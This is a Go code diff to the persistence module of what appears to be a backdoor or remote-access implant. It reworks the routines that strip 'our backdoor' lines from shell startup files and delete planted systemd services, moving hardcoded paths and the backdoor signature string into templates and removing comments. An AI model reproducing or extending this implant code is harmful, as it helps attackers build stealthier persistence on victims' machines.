+	// Get RC file names from template
+	rcBashrc := c.getTpl(template, idxRcBashrc)
+	rcProfile := c.getTpl(template, idxRcProfile)
+	rcBashProfile := c.getTpl(template, idxRcBashProfile)
+	rcZshrc := c.getTpl(template, idxRcZshrc)
+
+	if rcBashrc == "" {
+		rcBashrc = ".bashrc"
+	}
+
 	targetFiles := []string{
-		filepath.Join(currentUser.HomeDir, persistBashrc),
-		filepath.Join(currentUser.HomeDir, persistProfile),
-		filepath.Join(currentUser.HomeDir, persistBashProfile),
-		filepath.Join(currentUser.HomeDir, persistZshrc),
+		filepath.Join(currentUser.HomeDir, rcBashrc),
+		filepath.Join(currentUser.HomeDir, rcProfile),
+		filepath.Join(currentUser.HomeDir, rcBashProfile),
+		filepath.Join(currentUser.HomeDir, rcZshrc),
 	}
 
 	var results []string
 
+	// Get detection pattern from template
+	detectPattern := c.getTpl(template, idxBashDetectPattern)
+
 	for _, file := range targetFiles {
-		if err := c.cleanRCFile(file); err != nil {
+		if err := c.cleanRCFile(file, detectPattern); err != nil {
 			if !os.IsNotExist(err) {
 				results = append(results, ErrCtx(E11, file))
 			}
@@ -712,13 +761,16 @@ func (c *PersistenceCommand) removeBashrcPersistence() CommandResult {
 }
 
 // cleanRCFile removes backdoor from RC file
-func (c *PersistenceCommand) cleanRCFile(filePath string) error {
+func (c *PersistenceCommand) cleanRCFile(filePath string, detectPattern string) error {
 	content, err := os.ReadFile(filePath)
 	if err != nil {
 		return err
 	}
 
-	// Split into lines
+	if detectPattern == "" {
+		return nil // Nothing to detect
+	}
+
 	lines := strings.Split(string(content), "\n")
 	var cleanedLines []string
 	skipNext := 0
@@ -726,9 +778,7 @@ func (c *PersistenceCommand) cleanRCFile(filePath string) error {
 	for i := 0; i < len(lines); i++ {
 		line := lines[i]
 
-		// Look for our backdoor pattern (checking for the if statement structure)
-		if strings.Contains(line, persistBashIfSudo) {
-			// Found start of our backdoor, skip next 4 lines (the full backdoor block)
+		if strings.Contains(line, detectPattern) {
 			skipNext = 4
 			continue
 		}
@@ -741,24 +791,53 @@ func (c *PersistenceCommand) cleanRCFile(filePath string) error {
 		cleanedLines = append(cleanedLines, line)
 	}
 
-	// Remove any trailing empty lines we might have added
 	for len(cleanedLines) > 0 && cleanedLines[len(cleanedLines)-1] == "" {
 		cleanedLines = cleanedLines[:len(cleanedLines)-1]
 	}
 
-	// Write back cleaned content
 	return os.WriteFile(filePath, []byte(strings.Join(cleanedLines, "\n")), 0644)
 }
 
 // removeSystemdPersistence removes systemd service
-func (c *PersistenceCommand) removeSystemdPersistence(name string) CommandResult {
+func (c *PersistenceCommand) removeSystemdPersistence(name string, template *PersistenceTemplate) CommandResult {
 	var results []string
+
+	// Get paths from template
+	dotConfig := c.getTpl(template, idxDotConfig)
+	systemdDir := c.getTpl(template, idxSystemdDir)
+	userDir := c.getTpl(template, idxUserDir)
+	serviceExt := c.getTpl(template, idxServiceExt)
+	defaultTargetWants := c.getTpl(template, idxDefaultTargetWants)
+	multiUserTargetWants := c.getTpl(template, idxMultiUserTargetWants)
+	etcSystemd := c.getTpl(template, idxEtcSystemd)
+
+	if dotConfig == "" {
+		dotConfig = ".config"
+	}
+	if systemdDir == "" {
+		systemdDir = "systemd"
+	}
+	if userDir == "" {
+		userDir = "user"
+	}
+	if serviceExt == "" {
+		serviceExt = ".service"
+	}
+	if defaultTargetWants == "" {
+		defaultTargetWants = "default.target.wants"
+	}
+	if multiUserTargetWants == "" {
+		multiUserTargetWants = "multi-user.target.wants"
+	}
+	if etcSystemd == "" {
+		etcSystemd = "/etc/systemd/system"
+	}
 
 	// Try to remove user service
 	currentUser, err := user.Current()
 	if err == nil {
-		userServiceFile := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, name+persistServiceExt)
-		userLinkPath := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, persistDefaultTargetWants, name+persistServiceExt)
+		userServiceFile := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir, name+serviceExt)
+		userLinkPath := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir, defaultTargetWants, name+serviceExt)
 
 		if err := os.Remove(userServiceFile); err == nil {
 			results = append(results, SuccCtx(S2, userServiceFile))
@@ -766,9 +845,9 @@ func (c *PersistenceCommand) removeSystemdPersistence(name string) CommandResult
 		os.Remove(userLinkPath)
 	}
 
-	// Try to remove system service (if we have permissions)
-	systemServiceFile := filepath.Join(persistEtcSystemd, name+persistServiceExt)
-	systemLinkPath := filepath.Join(persistEtcSystemd, persistMultiUserTargetWants, name+persistServiceExt)
+	// Try to remove system service
+	systemServiceFile := filepath.Join(etcSystemd, name+serviceExt)
+	systemLinkPath := filepath.Join(etcSystemd, multiUserTargetWants, name+serviceExt)
 
 	if err := os.Remove(systemServiceFile); err == nil {
 		results = append(results, SuccCtx(S2, systemServiceFile))
